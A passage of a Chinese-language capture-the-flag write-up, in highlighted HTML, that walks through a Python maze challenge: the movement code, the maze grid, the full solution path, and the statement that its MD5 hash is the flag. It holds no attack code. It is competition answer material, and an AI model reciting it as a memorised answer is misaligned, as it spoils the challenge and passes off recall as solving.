keyword">and</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>              tj <span class="token operator">-=</span> <span class="token number">1</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              <span class="token keyword">if</span> <span class="token string">b'w'</span> <span class="token operator">==</span> inp <span class="token keyword">and</span> j <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                  ti <span class="token operator">-=</span> <span class="token number">1</span>              <span class="token keyword">else</span><span class="token punctuation">:</span>                  <span class="token keyword">if</span> <span class="token string">b's'</span> <span class="token operator">==</span> inp <span class="token keyword">and</span> j <span class="token operator">&lt;</span> row <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">:</span>                      ti <span class="token operator">+=</span> <span class="token number">1</span>                  <span class="token keyword">else</span><span class="token punctuation">:</span>                      <span class="token keyword">if</span> <span class="token string">b'd'</span> <span class="token operator">==</span> inp <span class="token keyword">and</span> i <span class="token operator">&lt;</span> col <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">:</span>                          tj <span class="token operator">+=</span> <span class="token number">1</span>                      <span class="token keyword">else</span><span class="token punctuation">:</span>                          <span class="token keyword">if</span> <span class="token string">b'q'</span> <span class="token operator">==</span> inp<span class="token punctuation">:</span>                              exit<span class="token punctuation">(</span><span class="token string">'bye!!'</span><span class="token punctuation">)</span>                          <span class="token keyword">else</span><span class="token punctuation">:</span>                              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'What???'</span><span class="token punctuation">)</span>                              <span class="token keyword">continue</span>          <span class="token keyword">if</span> maze<span class="token punctuation">[</span>ti<span class="token punctuation">]</span><span class="token punctuation">[</span>tj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>              <span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'no wayy!!'</span><span class="token punctuation">,</span> <span class="token string">"it's wall"</span><span class="token punctuation">,</span> <span class="token string">'nop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token keyword">continue</span>      <span class="token keyword">elif</span> maze<span class="token punctuation">[</span>ti<span class="token punctuation">]</span><span class="token punctuation">[</span>tj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'nice!!'</span><span class="token punctuation">,</span> <span class="token string">'yeah!!'</span><span class="token punctuation">,</span> <span class="token string">'Go on'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          i<span class="token punctuation">,</span> j <span class="token operator">=</span> ti<span class="token punctuation">,</span> tj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据代码逻辑，<code>i, j = (0, 1)</code> 代表初始位置在 (0, 1)，即迷宫的左上角那个 0 的地方，1 代表墙壁，只能顺着 0 的地方走  </p><p>后面的代码就是控制每一步的移动，上下左右分别用 “wsad” 代替  </p><p>因此不需要运行后面的代码，只需要自己得出最终路径即可</p><p><strong>这里可以将迷宫中的 <code>&quot;1&quot;</code> 去掉，只需要关注 <code>&quot;0&quot;</code> 的上下左右即可：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>走一遍即可得出路径：<code>sssssddssddssaaaassssddwwddddssssssaawwaassssddssaassddddwwddssddwwwwwwwwaawwddwwwwaaaawwddwwwwddssssddwwwwddddwwddddssaassaassddddssddssaassssssddsssssss</code></p><p>将路径进行 MD5 加密后的结果就是 flag <em>（用在线工具时，留意回车字符，有时会导致结果不一样）</em></p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">maze <span class="token operator">=</span> <span class="token punctuation">[</span>   <span class="token 